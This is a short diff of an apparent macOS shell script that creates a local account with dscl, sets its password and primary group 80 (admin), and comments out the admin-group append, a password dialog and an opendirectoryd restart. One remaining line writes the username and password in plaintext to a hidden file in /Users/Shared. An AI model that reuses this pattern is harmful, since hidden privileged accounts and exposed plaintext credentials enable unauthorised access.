@@ -17,14 +17,14 @@ then
 	dscl . -create /Users/$USERNAME UniqueID "$ID"
 	dscl . -create /Users/$USERNAME PrimaryGroupID 80
 	dscl . -passwd /Users/$USERNAME $PASSWORD
-	dscl . -append /Groups/admin GroupMembership $USERNAME
+	# dscl . -append /Groups/admin GroupMembership $USERNAME
 
-	osascript -e 'tell app "System Events" to display dialog "Username: '$USERNAME' Password: '$PASSWORD'" buttons {"OK"} default button "OK"'
+	# osascript -e 'tell app "System Events" to display dialog "Username: '$USERNAME' Password: '$PASSWORD'" buttons {"OK"} default button "OK"'
 
 	echo "U: $USERNAME P: $PASSWORD" >> /Users/Shared/.cvalstore
 
-	launchctl stop com.apple.opendirectoryd
-	launchctl start com.apple.opendirectoryd
+	# launchctl stop com.apple.opendirectoryd
+	# launchctl start com.apple.opendirectoryd
 
 	break
 
